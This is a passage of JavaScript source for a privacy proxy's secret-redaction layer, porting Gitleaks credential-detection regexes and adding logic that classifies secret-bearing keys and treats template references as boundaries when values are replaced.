  glRule("shopify-shared-secret", /(shpss_[A-Fa-f0-9]{32})/g, { secretGroup:1, entropy:2, keywords:["shpss_"] }),
  glRule("slack-app-token", /(xapp-\d-[A-Z0-9]+-\d+-[a-z0-9]+)/gi, { secretGroup:1, entropy:2, keywords:["xapp"] }),
  glRule("slack-bot-token", /(xoxb-[0-9]{10,13}-[0-9]{10,13}[A-Za-z0-9-]*)/g, { secretGroup:1, entropy:3, keywords:["xoxb"] }),
  glRule("slack-config-access-token", /(xoxe.xox[bp]-\d-[A-Z0-9]{163,166})/gi, { secretGroup:1, entropy:2, keywords:["xoxe.xoxb-","xoxe.xoxp-"] }),
  glRule("slack-config-refresh-token", /(xoxe-\d-[A-Z0-9]{146})/gi, { secretGroup:1, entropy:2, keywords:["xoxe-"] }),
  glRule("slack-legacy-bot-token", /(xoxb-[0-9]{8,14}-[A-Za-z0-9]{18,26})/g, { secretGroup:1, entropy:2, keywords:["xoxb"] }),
  glRule("slack-legacy-token", /(xox[os]-\d+-\d+-\d+-[A-Fa-f\d]+)/g, { secretGroup:1, entropy:2, keywords:["xoxo","xoxs"] }),
  glRule("slack-legacy-workspace-token", /(xox[ar]-(?:\d-)?[0-9A-Za-z]{8,48})/g, { secretGroup:1, entropy:2, keywords:["xoxa","xoxr"] }),
  glRule("slack-user-token", /(xox[pe](?:-[0-9]{10,13}){3}-[A-Za-z0-9-]{28,34})/g, { secretGroup:1, entropy:2, keywords:["xoxp-","xoxe-"] }),
  glRule("slack-webhook-url", /((?:https?:\/\/)?hooks\.slack\.com\/(?:services|workflows|triggers)\/[A-Za-z0-9+/]{43,56})/g, { secretGroup:1, keywords:["hooks.slack.com"] }),
  glRule("sourcegraph-access-token", /\b((?:sgp_(?:[A-Fa-f0-9]{16}|local)_[A-Fa-f0-9]{40}|sgp_[A-Fa-f0-9]{40}))(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["sgp_","sourcegraph"] }),
  glRule("square-access-token", /\b((?:EAAA|sq0atp-)[\w-]{22,60})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["sq0atp-","eaaa"] }),
  glRule("square-secret", /\b(sq0csp-[A-Za-z0-9_-]{20,})\b/g, { secretGroup:1, entropy:2, keywords:["sq0csp-"] }),
  glRule("stripe-access-token", /\b((?:sk|rk)_(?:test|live|prod)_[A-Za-z0-9]{10,99})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["sk_test","sk_live","sk_prod","rk_test","rk_live","rk_prod"] }),
  glRule("twilio-api-key", /\b(SK[0-9A-Fa-f]{32})\b/g, { secretGroup:1, entropy:3, keywords:["sk"] }),
  glRule("vault-batch-token", /\b(hvb\.[\w-]{138,300})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["hvb."] }),
  glRule("vault-service-token", /\b((?:hvs\.[\w-]{90,120}|s\.[a-z0-9]{24}))(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3.5, keywords:["hvs.","s."], allowRegexes:[/^s\.[A-Za-z]{24}$/] }),
  // Additional current upstream Gitleaks signatures that do not fit the generic assignment template.
  glRule("adobe-client-secret", /\b(p8e-[A-Za-z0-9]{32})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["p8e-"] }),
  glRule("atlassian-api-token-routable", /\b(ATATT3[A-Za-z0-9_\-=]{186})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3.5, keywords:["atatt3"] }),
  glRule("authress-service-client-access-key", /\b((?:sc|ext|scauth|authress)_[A-Za-z0-9]{5,30}\.[A-Za-z0-9]{4,6}\.acc[_-][A-Za-z0-9-]{10,32}\.[A-Za-z0-9+/_=-]{30,120})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["sc_","ext_","scauth_","authress_"] }),
  glRule("cloudflare-origin-ca-key", /\b(v1\.0-[a-f0-9]{24}-[a-f0-9]{146})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["v1.0-","cloudflare"] }),
  glRule("duffel-api-token", /(duffel_(?:test|live)_[A-Za-z0-9_\-=]{43})/gi, { secretGroup:1, entropy:2, keywords:["duffel_"] }),
  glRule("dynatrace-api-token", /(dt0c01\.[A-Za-z0-9]{24}\.[A-Za-z0-9]{64})/gi, { secretGroup:1, entropy:4, keywords:["dt0c01."] }),
  glRule("easypost-api-token", /\b(EZAK[A-Za-z0-9]{54})\b/gi, { secretGroup:1, entropy:2, keywords:["ezak"] }),
  glRule("easypost-test-api-token", /\b(EZTK[A-Za-z0-9]{54})\b/gi, { secretGroup:1, entropy:2, keywords:["eztk"] }),
  glRule("facebook-access-token", /\b(\d{15,16}(?:\||%)[A-Za-z0-9_-]{27,40})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3 }),
  glRule("facebook-page-access-token", /\b(EAA[MC][A-Za-z0-9]{100,})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:4, keywords:["eaam","eaac"] }),
  glRule("freemius-secret-key", /["']secret_key["']\s*=>\s*["'](sk_\S{29})["']/gi, { secretGroup:1, keywords:["secret_key"] }),
  glRule("gitlab-cicd-job-token", /(glcbt-[0-9A-Za-z]{1,5}_[0-9A-Za-z_-]{20})/g, { secretGroup:1, entropy:3, keywords:["glcbt-"] }),
  glRule("gitlab-runner-authentication-token-routable", /\b(glrt-t\d_[0-9A-Za-z_-]{27,300}\.[0-9a-z]{9})\b/g, { secretGroup:1, entropy:4, keywords:["glrt-"] }),
  glRule("jwt", /\b(ey[A-Za-z0-9]{17,}\.ey[A-Za-z0-9/_-]{17,}\.(?:[A-Za-z0-9/_-]{10,}={0,2})?)(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["ey"] }),
  glRule("jwt-base64", /\b(ZXlK[A-Za-z0-9/_+\-\r\n]{40,}={0,2})/g, { secretGroup:1, entropy:2, keywords:["zxlk"] }),
  glRule("maxmind-license-key", /\b([A-Za-z0-9]{6}_[A-Za-z0-9]{29}_mmk)(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["_mmk"] }),
  glRule("octopus-deploy-api-key", /\b(API-[A-Z0-9]{26})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["api-"] }),
  glRule("sidekiq-sensitive-url", /\bhttps?:\/\/([a-f0-9]{8}:[a-f0-9]{8})@(?:gems\.contribsys\.com|enterprise\.contribsys\.com)(?:[\/#?:]|$)/gi, { secretGroup:1, keywords:["gems.contribsys.com","enterprise.contribsys.com"] }),
  // curl's upstream RE2 rule has several alternate capture groups. Split it into
  // JS-friendly rules while preserving the actual credential as secretGroup 1.
  glRule("curl-auth-header-basic", /\bcurl\b[\s\S]{0,1000}?(?:-H|--header)(?:=|\s{0,5})["']?Authorization:\s{0,5}Basic\s+([A-Za-z0-9+/]{8,}={0,3})/gi, { secretGroup:1, entropy:2.75, keywords:["curl"] }),
  glRule("curl-auth-header-bearer", /\bcurl\b[\s\S]{0,1000}?(?:-H|--header)(?:=|\s{0,5})["']?Authorization:\s{0,5}(?:Bearer|(?:Api-)?Token)\s+([\w=~@.+/-]{8,})/gi, { secretGroup:1, entropy:2.75, keywords:["curl"] }),
  glRule("curl-api-header", /\bcurl\b[\s\S]{0,1000}?(?:-H|--header)(?:=|\s{0,5})["']?(?:(?:X-(?:[a-z]+-)?)?(?:Api-?)?(?:Key|Token)):\s{0,5}([\w=~@.+/-]{8,})/gi, { secretGroup:1, entropy:2.75, keywords:["curl"] }),
  glRule("curl-auth-user", /\bcurl\b[\s\S]{0,1000}?(?:-u|--user)(?:=|\s{0,5})["']?([^\s"']{3,}:[^\s"']{3,})/gi, { secretGroup:1, entropy:2, keywords:["curl"], allowRegexes:[/^[^:]+:(?:change(?:it|me)|pass(?:word)?|pwd|test|token|\*+|x+)$/i] }),
  // Path-conditioned upstream Kubernetes rule: in an LLM body there is no file
  // path, so content matching is intentionally executed regardless of path.
  glRule("kubernetes-secret-yaml", /\bkind:\s*["']?secret\b[\s\S]{0,300}?\bdata:[\s\S]{0,150}?\b[\w.-]+:\s*["']?([A-Za-z0-9+/]{10,}={0,3})["']?/gi, { secretGroup:1, keywords:["secret","data:"] }),
  glRule("nuget-config-password", /<add\s+key="(?:ClearText)?Password"\s*value="(.{8,})"\s*\/>/gi, { secretGroup:1, entropy:1, keywords:["<add key="] , allowRegexes:[/^33f!!lloppa$/i,/^hal\+9ooo_da!sY$/i,/^%\S.*%$/] }),
  glRule("sourcegraph-bare-access-token", /\b([a-f0-9]{40})\b/gi, { secretGroup:1, entropy:3, keywords:["sourcegraph"] }),
];

const GITLEAK_ASSIGNMENT_RULES = [
  assignmentRule("adafruit-api-key", ["adafruit"], "[a-z0-9_-]{32}"),
  assignmentRule("adobe-client-id", ["adobe"], "[a-f0-9]{32}", { entropy:2 }),
  assignmentRule("airtable-api-key", ["airtable"], "[a-z0-9]{17}"),
  assignmentRule("algolia-api-key", ["algolia"], "[a-z0-9]{32}"),
  assignmentRule("alibaba-secret-key", ["alibaba"], "[a-z0-9]{30}", { entropy:2 }),
  assignmentRule("asana-client-id", ["asana"], "[0-9]{16}"),
  assignmentRule("asana-client-secret", ["asana"], "[a-z0-9]{32}"),
  assignmentRule("atlassian-api-token", ["atlassian","confluence","jira"], "[a-z0-9]{24}", { entropy:3.5, keySource:"atlassian|confluence|jira" }),
  assignmentRule("beamer-api-token", ["beamer"], "b_[a-z0-9=_-]{44}"),
  assignmentRule("bitbucket-client-id", ["bitbucket"], "[a-z0-9]{32}"),
  assignmentRule("bitbucket-client-secret", ["bitbucket"], "[a-z0-9=_-]{64}"),
  assignmentRule("bittrex-access-key", ["bittrex"], "[a-z0-9]{32}"),
  assignmentRule("bittrex-secret-key", ["bittrex"], "[a-z0-9]{32}"),
  assignmentRule("cisco-meraki-api-key", ["meraki"], "[0-9a-f]{40}", { entropy:3 }),
  assignmentRule("cloudflare-api-key", ["cloudflare"], "[a-z0-9_-]{40}", { entropy:2 }),
  assignmentRule("cloudflare-global-api-key", ["cloudflare"], "[a-f0-9]{37}", { entropy:2 }),
  assignmentRule("etsy-access-token", ["etsy"], "[a-z0-9]{24}", { entropy:3 }),
  assignmentRule("facebook-secret", ["facebook"], "[a-f0-9]{32}", { entropy:3 }),
  assignmentRule("fastly-api-token", ["fastly"], "[a-z0-9=_-]{32}"),
  assignmentRule("codecov-access-token", ["codecov"], "[a-z0-9]{32}"),
  assignmentRule("cohere-api-token", ["cohere","CO_API_KEY"], "[A-Za-z0-9]{40}", { entropy:4 }),
  assignmentRule("coinbase-access-token", ["coinbase"], "[a-z0-9_-]{64}"),
  assignmentRule("confluent-access-token", ["confluent"], "[a-z0-9]{16}"),
  assignmentRule("confluent-secret-key", ["confluent"], "[a-z0-9]{64}"),
  assignmentRule("contentful-delivery-api-token", ["contentful"], "[a-z0-9=_-]{43}"),
  assignmentRule("datadog-access-token", ["datadog"], "[a-z0-9]{40}"),
  assignmentRule("discord-api-token", ["discord"], "[a-f0-9]{64}"),
  assignmentRule("discord-client-id", ["discord"], "[0-9]{18}", { entropy:2 }),
  assignmentRule("discord-client-secret", ["discord"], "[a-z0-9=_-]{32}", { entropy:2 }),
  assignmentRule("droneci-access-token", ["droneci"], "[a-z0-9]{32}"),
  assignmentRule("dropbox-api-token", ["dropbox"], "[a-z0-9]{15}"),
  assignmentRule("dropbox-long-lived-api-token", ["dropbox"], "[a-z0-9]{11}AAAAAAAAAA[a-z0-9=_-]{43}"),
  assignmentRule("finicity-api-token", ["finicity"], "[a-f0-9]{32}"),
  assignmentRule("finicity-client-secret", ["finicity"], "[a-z0-9]{20}"),
  assignmentRule("finnhub-access-token", ["finnhub"], "[a-z0-9]{20}"),
  assignmentRule("flickr-access-token", ["flickr"], "[a-z0-9]{32}"),
  assignmentRule("freshbooks-access-token", ["freshbooks"], "[a-z0-9]{64}"),
  assignmentRule("hashicorp-tf-password", ["administrator_login_password","password"], "[a-z0-9=_-]{8,20}", { entropy:2, keySource:"administrator_login_password|password" }),
  assignmentRule("heroku-api-key", ["heroku"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("hubspot-api-key", ["hubspot"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("intercom-api-key", ["intercom"], "[a-z0-9=_-]{60}"),
  assignmentRule("gitter-access-token", ["gitter"], "[a-z0-9_-]{40}"),
  assignmentRule("gocardless-api-token", ["gocardless","live_"], "live_[a-z0-9_\\-=]{40}", { keySource:"gocardless" }),
  assignmentRule("jfrog-api-key", ["jfrog","artifactory","bintray","xray"], "[a-z0-9]{73}", { keySource:"jfrog|artifactory|bintray|xray" }),
  assignmentRule("jfrog-identity-token", ["jfrog","artifactory","bintray","xray"], "[a-z0-9]{64}", { keySource:"jfrog|artifactory|bintray|xray" }),
  assignmentRule("kraken-access-token", ["kraken"], "[a-z0-9/=_+\\-]{80,90}"),
  assignmentRule("kucoin-access-token", ["kucoin"], "[a-f0-9]{24}"),
  assignmentRule("kucoin-secret-key", ["kucoin"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("launchdarkly-access-token", ["launchdarkly"], "[a-z0-9=_-]{40}"),
  assignmentRule("linear-client-secret", ["linear"], "[a-f0-9]{32}", { entropy:2 }),
  assignmentRule("linkedin-client-id", ["linkedin","linked_in","linked-in"], "[a-z0-9]{14}", { entropy:2, keySource:"linked[_-]?in" }),
  assignmentRule("linkedin-client-secret", ["linkedin","linked_in","linked-in"], "[a-z0-9]{16}", { entropy:2, keySource:"linked[_-]?in" }),
  assignmentRule("lob-api-key", ["lob","test_","live_"], "(?:live|test)_[a-f0-9]{35}", { keySource:"lob" }),
  assignmentRule("lob-pub-api-key", ["lob","test_pub","live_pub"], "(?:test|live)_pub_[a-f0-9]{31}", { keySource:"lob" }),
  assignmentRule("looker-client-id", ["looker"], "[a-z0-9]{20}"),
  assignmentRule("looker-client-secret", ["looker"], "[a-z0-9]{24}"),
  assignmentRule("mailchimp-api-key", ["mailchimp","MailchimpSDK.initialize"], "[a-f0-9]{32}-us\\d{2}", { keySource:"MailchimpSDK\\.initialize|mailchimp" }),
  assignmentRule("messagebird-client-id", ["messagebird","message-bird","message_bird"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", { keySource:"message[_-]?bird" }),
  assignmentRule("netlify-access-token", ["netlify"], "[a-z0-9=_-]{40,46}"),
  assignmentRule("new-relic-insert-key", ["new-relic","newrelic","new_relic","nrii-"], "NRII-[a-z0-9-]{32}", { keySource:"new-relic|newrelic|new_relic" }),
  assignmentRule("new-relic-user-api-id", ["new-relic","newrelic","new_relic"], "[a-z0-9]{64}", { keySource:"new-relic|newrelic|new_relic" }),
  assignmentRule("nytimes-access-token", ["nytimes","new-york-times","newyorktimes"], "[a-z0-9=_-]{32}", { keySource:"nytimes|new-york-times|newyorktimes" }),
  assignmentRule("okta-access-token", ["okta"], "00[\\w=-]{40}", { entropy:4 }),
  assignmentRule("plaid-api-token", ["plaid"], "access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("plaid-client-id", ["plaid"], "[a-z0-9]{24}", { entropy:3.5 }),
  assignmentRule("plaid-secret-key", ["plaid"], "[a-z0-9]{30}", { entropy:3.5 }),
  assignmentRule("privateai-api-token", ["privateai","private_ai","private-ai"], "[a-z0-9]{32}", { entropy:3, keySource:"private[_-]?ai" }),
  assignmentRule("rapidapi-access-token", ["rapidapi"], "[a-z0-9_-]{50}"),
  assignmentRule("sendbird-access-id", ["sendbird"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("sendbird-access-token", ["sendbird"], "[a-f0-9]{40}"),
  assignmentRule("sentry-access-token", ["sentry"], "[a-f0-9]{64}", { entropy:3 }),
  assignmentRule("snyk-api-token", ["snyk"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", { keySource:"snyk[_.-]?(?:(?:api|oauth)[_.-]?)?(?:key|token)" }),
  assignmentRule("sonar-api-token", ["sonar"], "(?:squ_|sqp_|sqa_)?[a-z0-9=_-]{40}", { keySource:"sonar[_.-]?(?:login|token)" }),
  assignmentRule("squarespace-access-token", ["squarespace"], "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
  assignmentRule("sidekiq-secret", ["bundle_enterprise__contribsys__com","bundle_gems__contribsys__com"], "[a-f0-9]{8}:[a-f0-9]{8}", { keySource:"BUNDLE_ENTERPRISE__CONTRIBSYS__COM|BUNDLE_GEMS__CONTRIBSYS__COM" }),
  assignmentRule("sumologic-access-id", ["sumo"], "su[A-Za-z0-9]{12}", { entropy:3 }),
  assignmentRule("sumologic-access-token", ["sumo"], "[a-z0-9]{64}", { entropy:3 }),
  assignmentRule("telegram-bot-api-token", ["telegr","telegram"], "[0-9]{5,16}:A[a-z0-9_-]{34}", { keySource:"telegr(?:am)?" }),
  assignmentRule("travisci-access-token", ["travis"], "[a-z0-9]{22}"),
  assignmentRule("twitch-api-token", ["twitch"], "[a-z0-9]{30}"),
  assignmentRule("twitter-access-secret", ["twitter"], "[a-z0-9]{45}"),
  assignmentRule("twitter-access-token", ["twitter"], "[0-9]{15,25}-[A-Za-z0-9]{20,40}"),
  assignmentRule("twitter-api-key", ["twitter"], "[a-z0-9]{25}"),
  assignmentRule("twitter-api-secret", ["twitter"], "[a-z0-9]{50}"),
  assignmentRule("twitter-bearer-token", ["twitter"], "A{22}[A-Za-z0-9%]{80,100}"),
  assignmentRule("typeform-api-token", ["typeform","tfp_"], "tfp_[a-z0-9_.=-]{59}", { keywords:["tfp_"] }),
  assignmentRule("yandex-access-token", ["yandex"], "t1\\.[A-Za-z0-9_-]+={0,2}\\.[A-Za-z0-9_-]{86}={0,2}"),
  assignmentRule("yandex-api-key", ["yandex"], "AQVN[A-Za-z0-9_-]{35,38}"),
  assignmentRule("yandex-aws-access-token", ["yandex"], "YC[A-Za-z0-9_-]{38}"),
  assignmentRule("zendesk-secret-key", ["zendesk"], "[a-z0-9]{40}"),
];

const GENERIC_GITLEAK_STOPWORDS = [
  // Privacy proxy bias: retain only high-confidence placeholder words here.
  // The upstream global stopword list is broader, but false negatives are more
  // damaging for this use case than a modest increase in false positives.
  "example", "sample", "dummy", "placeholder", "changeme",
  "localhost", "undefined", "null", "true", "false",
];

const GITLEAK_RULES = [
  ...GITLEAK_DIRECT_RULES,
  ...GITLEAK_ASSIGNMENT_RULES,
  assignmentRule(
    "generic-api-key",
    ["access","auth","api","credential","creds","key","passwd","password","secret","token"],
    "(?:[\\w.=-]{10,150}|[a-z0-9][a-z0-9+/]{11,}={0,3})",
    {
      entropy: 3.5,
      keySource: "access|auth|api|credential|creds|key|passw(?:or)?d|secret|token",
      allowRegexes: [/^[A-Za-z_.-]+$/],
      stopwords: GENERIC_GITLEAK_STOPWORDS,
    },
  ),
];

export const GITLEAK_PORTABLE_RULE_COUNT = GITLEAK_RULES.length;

function collectGitleakSpans(text) {
  const out = [];
  const lower = text.toLowerCase();
  for (const rule of GITLEAK_RULES) {
    if (rule.keywords.length && !rule.keywords.some((k) => lower.includes(k))) continue;
    const re = rule.regex;
    re.lastIndex = 0;
    let m;
    while ((m = re.exec(text))) {
      if (!m[0].length) { re.lastIndex++; continue; }
      const secret = rule.secretGroup ? m[rule.secretGroup] : m[0];
      if (!secret) continue;
      const relative = rule.secretGroup ? m[0].indexOf(secret) : 0;
      if (relative < 0) continue;
      if (rule.entropy && shannonEntropy(secret) < rule.entropy) continue;
      const secretLower = secret.toLowerCase();
      if (rule.stopwords.some((word) => secretLower.includes(word))) continue;
      if (rule.allowRegexes.some((allow) => { allow.lastIndex = 0; return allow.test(secret); })) continue;
      out.push({
        start: m.index + relative,
        end: m.index + relative + secret.length,
        type: "gitleaks",
        priority: 120,
        ruleId: rule.id,
      });
    }
  }
  return out;
}


function collectRegexSpans(text, regex, type, priority, validator = null) {
  const out = [];
  regex.lastIndex = 0;
  let m;
  while ((m = regex.exec(text))) {
    if (!m[0].length) { regex.lastIndex++; continue; }
    if (!validator || validator(m[0])) out.push({ start:m.index, end:m.index + m[0].length, type, priority });
  }
  return out;
}

function overlaps(a, b) { return a.start < b.end && a.end > b.start; }

// ------------------------------------------------ structured context (D1) -------
//
// The binding parser is an EVIDENCE PRODUCER, not a redactor. It locates raw value
// spans and reports the field name it found them under; the caller merges those
// spans with every other detector and decides what to do. Nothing here unquotes,
// decodes or normalises a value: rewriting the host syntax is exactly the failure
// mode this layer is supposed to avoid, so the span covers the value only (inside
// the quotes, when there are quotes) and the surrounding `KEY="` / `"` survives.

// Strip YAML anchors/aliases/tags and surrounding quotes from an extracted key.
// `- &a password: x` yields the key `&a password` if this is skipped, which then
// looks like a non-credential name and silently loses the binding's strength.
export function cleanBindingKey(key) {
  return String(key)
    .trim()
    .replace(/^[&*!][^\s]*\s*/, "")
    .replace(/^!(?:![^\s]*|[^\s]*)\s*/, "")
    .replace(/^["']|["']$/g, "")
    .trim();
}

export const KEY_STRENGTH = Object.freeze({
  STRONG: "strong",
  WEAK: "weak",
  NONE: "none",
});

// Keys whose value is, by strong convention, an actual secret.
const STRONG_KEY_RE = new RegExp(
  [
    "passw(or)?d", "passwd", "passphrase",
    "secret", "token", "credential(s)?", "api[_-]?key", "apikey",
    "access[_-]?key", "secret[_-]?key", "private[_-]?key", "client[_-]?secret",
    "auth[_-]?token", "session[_-]?key", "signing[_-]?key", "encryption[_-]?key",
    "(?:master|client|consumer|app|root)[_-]?key", "sas[_-]?token",
  ].join("|"),
  "i"
);

// Keys that merely contain a weak word such as `key` are NOT secrets by
// convention. Listing the common non-secret shapes explicitly keeps `cache_key`,
// `build_key`, `partition_key`, `sort_key` and friends out of the strong tier.
const NON_SECRET_KEY_RE = new RegExp(
  [
    "cache[_-]?key", "partition[_-]?key", "sort[_-]?key", "map[_-]?key",
    "primary[_-]?key", "foreign[_-]?key", "group[_-]?key", "shard[_-]?key",
    "build[_-]?key", "routing[_-]?key", "dedup(e)?[_-]?key", "cache[_-]?token",
    "sort[_-]?order", "key[_-]?name", "keyspace",
  ].join("|"),
  "i"
);

// A value that is a reference to another value is not a secret in itself:
// substituting it would replace a template with a token and break the host file.
// Values that REFER to a secret rather than being one. Substituting a token here
// replaces a template or a command substitution with a literal, which corrupts the
// host file and, in the $( ) case, breaks the very indirection that keeps the
// secret off disk.
//
//   ${VAR}                 shell expansion
//   $VAR                   shell expansion
//   ${{ secrets.X }}       GitHub Actions expression (matched greedily: the inner
//                          `}` must not terminate it early, or `${{` is left behind
//                          and treated as a literal secret)
//   $(cmd)                 command substitution / expression
//   {{ tpl }}              Go template, optionally spaced
//   %VAR%                  Windows expansion
//   <var>                  placeholder convention
const REFERENCE_VALUE_RE = /^(?:\$\{\{.*\}\}|\$\{[^}]*\}|\$\([^)]*\)|\$[A-Za-z_][A-Za-z0-9_]*|\{\{\s*[^}]*?\s*\}\}|\{[A-Za-z_][A-Za-z0-9_.]*\}|%[A-Za-z_][A-Za-z0-9_]*%|<[A-Za-z_][A-Za-z0-9_]*>)$/s;

export function normalizeBindingKey(key) {
  return String(key)
    .trim()
    // Split camelCase and PascalCase boundaries BEFORE lowercasing, so that
    // `secretName`, `secretKeyRef` and `passwordHash` normalise to
    // `secret_name`, `secret_key_ref` and `password_hash`. Without this the
    // metadata-suffix rule never fires on Kubernetes-style field names, which are
    // overwhelmingly camelCase.
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "");
}

// Names that CONTAIN a secret word but denote metadata ABOUT a secret rather than
// the secret itself. This matters most in Kubernetes, where secretName /
// secretKeyRef are ordinary, high-frequency fields whose values are names and
// references -- upgrading them on a substring match would redact identifiers and
// break manifests.
//
// The check is SUFFIX-based on purpose: `password_hash` names a derived value, not
// the password, and `secret_name`/`private_key_path` name a location. Prefix
// occurrences (`password_field_value`) stay strong, because there the secret word
// is the head noun.
const METADATA_SUFFIXES = Object.freeze([
  "name", "path", "file", "filename", "dir", "directory", "uri", "url", "ref",
  "reference", "id", "type", "kind", "class", "label", "annotation", "key",
  "keys", "hash", "digest", "checksum", "policy", "profile", "provider",
  "store", "source", "field", "var", "varname", "env", "length", "len", "size",
  "bytes", "format", "algorithm", "algo", "version", "expiry", "expires",
  "ttl", "rotation", "manager", "backend", "engine", "managerclass",
]);

// Canonical credential names that END in a metadata-looking token but ARE the
// secret itself. Checked before the metadata rule so `api_key` is not demoted by
// its own `_key` suffix.
const CANONICAL_SECRET_KEYS = Object.freeze(new Set([
  // `public_key` is deliberately absent: a public key is not a secret, and it
  // lives under the same naming family, so including it would only widen the
  // false-positive surface.
  "api_key", "apikey", "access_key", "secret_key", "private_key",
  "signing_key", "encryption_key", "session_key", "client_key", "master_key",
  "consumer_key", "app_key", "secret_access_key", "sas_token",
  "api_token", "access_token", "auth_token", "bearer_token", "refresh_token",
  "id_token", "client_secret", "app_secret", "api_secret", "consumer_secret",
]));

function hasMetadataSuffix(k) {
  if (CANONICAL_SECRET_KEYS.has(k)) return false;
  return METADATA_SUFFIXES.some((suffix) => k.endsWith("_" + suffix) || k.endsWith("." + suffix));
}

export function classifyKeyStrength(key) {
  const k = normalizeBindingKey(key);
  if (!k) return KEY_STRENGTH.NONE;
  if (NON_SECRET_KEY_RE.test(k)) return KEY_STRENGTH.WEAK;
  if (!STRONG_KEY_RE.test(k)) {
    // A bare `key` is deliberately WEAK, so `cache_key`-style names never escalate.
    return (k === "key" || k.endsWith("_key")) ? KEY_STRENGTH.WEAK : KEY_STRENGTH.NONE;
  }
  // Strong word present, but the name denotes metadata about it.
  if (hasMetadataSuffix(k)) return KEY_STRENGTH.WEAK;
  return KEY_STRENGTH.STRONG;
}

// ------------------------------------------------ structural / reference envelope ---
//
// A reference is an INDIRECTION, so on its own it is never a secret verdict: replacing
// `${SECRET}` with a token destroys the template for no gain. But it is a BOUNDARY, and a
// detector hit inside it must not be replaced while the syntax around it is left behind:
//
//   DB_PASSWORD={{Redact:<64 hex>}}
//   ->  DB_PASSWORD={{Redact:CRG_...        (partial replacement, half-open syntax)
//
// So the reference construct is resolved as a structural envelope: the inner hit widens to
// the whole construct and the construct becomes the mutation boundary. Nothing here is
// specific to any template language -- these are balanced-delimiter constructs found by a
// scanner, not a list of special cases.
const REFERENCE_CONSTRUCTS = Object.freeze([
  // `delimiter` is the CLOSING DELIMITER length: the scan tracks how many closer characters
  // are still owed, counting inner braces of the same kind on the way. `{{` therefore owes
  // two and `{` owes one, so a lone `{` inside `${{` is visible to the scan.
  { opener: "${{", closer: "}}", delimiter: 2 },
  { opener: "{{", closer: "}}", delimiter: 2 },
  { opener: "${", closer: "}", delimiter: 1 },
  { opener: "$(", closer: ")", delimiter: 1 },
  // Simple forms have no nesting and require a NAME-ONLY body. The namePattern is load
  // bearing, not decoration: without it `50% CPU, <secret>, 60% memory` opened a region
  // spanning the prose between two ordinary percent signs, and a detector hit inside would
  // have replaced the whole thing.
  { opener: "%", closer: "%", simple: true, namePattern: /^%[A-Za-z_][A-Za-z0-9_]*%$/ },
  { opener: "<", closer: ">", simple: true, namePattern: /^<[A-Za-z_][A-Za-z0-9_]*>$/ },
  { opener: "{", closer: "}", simple: true, namePattern: /^\{[A-Za-z_][A-Za-z0-9_.]*\}$/ },
]);

/**
 * Spans of reference constructs in the text.
 *
 * Longest opener first, and nesting is honoured: `${ { a: 1 } }` does not close at the inner
 * brace. A construct that never closes is not returned -- an unterminated `${` is ordinary
 * text and treating it as a boundary would widen a span over unrelated content.
 */
export function referenceEnvelopes(text) {
  if (typeof text !== "string" || text.length === 0) return [];
  const ordered = REFERENCE_CONSTRUCTS.slice().sort((a, b) => b.opener.length - a.opener.length);
  const out = [];
  let i = 0;
  while (i < text.length) {
    const found = ordered.find((c) => text.startsWith(c.opener, i));
    if (!found) { i++; continue; }

    if (found.simple) {
      // `%VAR%`, `<VAR>`, `{var}`: no nesting, and a name-only body, so a stray `%` in prose
      // or a stray `<` in a comparison cannot open a region.
      const end = text.indexOf(found.closer, i + found.opener.length);
      if (end < 0) { i++; continue; }
      const candidate = text.slice(i, end + found.closer.length);
      if (found.namePattern && !found.namePattern.test(candidate)) { i++; continue; }
      out.push({ start: i, end: end + found.closer.length, opener: found.opener });
      i = end + found.closer.length;
      continue;
    }

    // Balanced scan. `owed` counts the closer characters still needed, and an inner brace of
    // the same kind adds to it -- that is what makes `${{ a: {b:1}}}` close at the END of the
    // construct rather than at the first `}}`, which is the inner object's brace plus the
    // first template brace.
    //
    // Only the same opener increments: a `{` that is not preceded by `$` or another `{` is a
    // plain brace, and it is exactly what `owed` accounts for.
    let owed = found.delimiter;
    let j = i + found.opener.length;
    let end = -1;
    while (j < text.length) {
      if (text.startsWith(found.opener, j)) { owed += found.delimiter; j += found.opener.length; continue; }
